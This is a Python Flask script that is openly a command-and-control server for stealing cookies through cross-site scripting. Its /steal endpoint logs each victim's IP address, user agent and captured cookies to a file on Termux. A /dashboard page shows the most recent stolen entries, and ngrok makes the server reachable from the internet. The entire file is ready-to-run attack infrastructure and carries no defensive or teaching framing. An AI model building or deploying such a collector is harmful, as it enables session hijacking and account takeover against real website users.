from flask import Flask, request, render_template_string
from pyngrok import ngrok
import datetime, os, sys

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32)
app.config['MAX_COOKIE_SIZE'] = 4096  # Block large payloads

# HTML Template for Live Dashboard
DASH_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>XSS C2 Live Feed</title>
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: monospace; }
        .victim { border: 1px solid #3c3c3c; padding: 10px; margin: 5px; }
        .timestamp { color: #ff5555; }
        .cookies { color: #55ff55; }
    </style>
</head>
<body>
    <h1>Active Cookie Stream</h1>
    {% for log in logs %}
        <div class="victim">
            <span class="timestamp">[{{ log.split(' - ')[0] }}]</span>
            <span class="ip">{{ log.split(' - ')[1] }}</span>
            <div class="cookies">{{ log.split(' - ')[2] }}</div>
        </div>
    {% endfor %}
</body>
</html>
"""

@app.route('/steal')
def steal_cookie():
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    cookies = request.args.get('c', 'NO_COOKIES')
    ua = request.headers.get('User-Agent', 'UNKNOWN_UA')
    
    log_entry = f"{datetime.datetime.now():%Y-%m-%d %H:%M:%S} - {client_ip} - {ua} - {cookies}"
    
    with open('/data/data/com.termux/files/usr/var/xss_db/live_cookies.log', 'a') as f:
        f.write(log_entry + '\n')
    
    return "HTTP/1.1 204 No Content\r\n\r\n", 204

@app.route('/dashboard')
def dashboard():
    with open('/data/data/com.termux/files/usr/var/xss_db/live_cookies.log', 'r') as f:
        logs = f.readlines()[-50:]  # Show last 50 entries
    return render_template_string(DASH_TEMPLATE, logs=logs)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Missing Ngrok token!")
        sys.exit(1)
        
    ngrok.set_auth_token(sys.argv[1])
    public_url = ngrok.connect(5000, bind_tls=True).public_url
    print(f"[*] C2 Active: {public_url}")
    app.run(port=5000)